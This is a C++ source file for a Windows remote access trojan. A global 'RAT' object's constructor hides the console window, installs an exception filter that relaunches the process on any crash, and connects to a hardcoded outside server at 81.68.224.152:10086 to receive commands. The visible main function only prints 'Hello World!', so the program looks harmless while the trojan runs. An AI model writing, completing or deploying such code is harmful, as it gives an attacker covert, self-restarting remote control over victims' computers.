#include "Kernel.h"
#include "IOCPClient.h"

class RAT{
private:
	static void StartRAT(){
		char szServerAddr[32] = "81.68.224.152";
		USHORT Port = 10086;

		CIOCPClient::SocketInit();
		CKernel kernel;
		CIOCPClient io(szServerAddr, Port, TRUE, INFINITE);

		io.BindHandler(&kernel);
		io.Run();
		io.UnbindHandler();
		CIOCPClient::SocketTerm();
	}

	static void Restart(){
		WCHAR szFileName[MAX_PATH];
		GetModuleFileName(GetModuleHandle(0), szFileName, MAX_PATH);

		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };

		if (FALSE == CreateProcess(szFileName, 0, 0, 0, 0, 0, 0, 0, &si, &pi)){
			StartRAT();
		}
		else{
			ExitProcess(0);
		}
	}
	static LONG WINAPI TOP_LEVEL_EXCEPTION_FILTER(
		_In_ struct _EXCEPTION_POINTERS *ExceptionInfo
		){
		ExceptionInfo->ContextRecord->Eip = (DWORD)Restart;
		return EXCEPTION_CONTINUE_EXECUTION;
	}

public:
	RAT(){
		//hide window.
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		//
		SetUnhandledExceptionFilter(TOP_LEVEL_EXCEPTION_FILTER);
		StartRAT();
	}
};

RAT rat;

int main(){

	printf("Hello World!\n");
	return 0;
}